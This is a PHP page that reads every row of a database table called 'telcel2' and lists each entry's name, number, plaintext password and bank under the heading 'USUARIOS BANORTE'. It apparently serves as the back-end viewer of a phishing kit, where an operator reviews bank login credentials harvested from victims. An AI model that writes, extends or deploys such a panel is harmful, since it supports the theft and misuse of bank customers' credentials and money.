<?php 
require 'cdn.html';
require 'cnn.php';
$usuario = "SELECT * FROM telcel2";
 ?>
<!DOCTYPE html>
<html lang="en">
<link rel="shortcut icon" href="a.PNG">
<head>
  

  <title>Usuario</title>
  
  <!-- Favicons -->



</head>

<body>

 <!-- End Header -->
<center>
<br>
<br>
<br>
<br>
<br>
<br>


  <div class="card" style="width: 70rem">
        <div class="card text-white bg-dark mb-">
          <h5 class="card-header"> 
            <strong>USUARIOS BANORTE</strong>
          </h5>
          <br>
          <table class="table table-hover table-condensed">
            <tr>
              <?php
              $query = $cnnPDO->prepare('SELECT * from telcel2');
              $query->execute(); 

              $columnas = 1;
              while($campo = $query->fetch())
              {
                if ($columnas > 3)
                {
                  $columnas = 1;
                  ?>
                </tr>

                  <tr>
                  <?php
                }
                else
                {
                  $columnas = $columnas + 1; 
                  ?>

                  <td>
                    <div class='card text-black bg-black mb-4' style='max-width: 30rem;'>
                      <div class='card-header'><h5><?php echo $campo['nombre'];?></h5>
                      </div>
                      <div class='card text-white bg-info mb-3'>
                        <h6 class='card-title'>
                          <?php echo $campo['nombre'];?><br>
                            <?php echo $campo['numero'];?><br>
                          <?php echo $campo['password'];?><br>  
                        
                          <?php echo $campo['banco'];?><br>                     
                        </h6>

                      </div>
                    </div>
                  </td>
                  <?php
                }
                

              }
              ?>
            </tr>
          </table>
  

 
</boddy>
</html>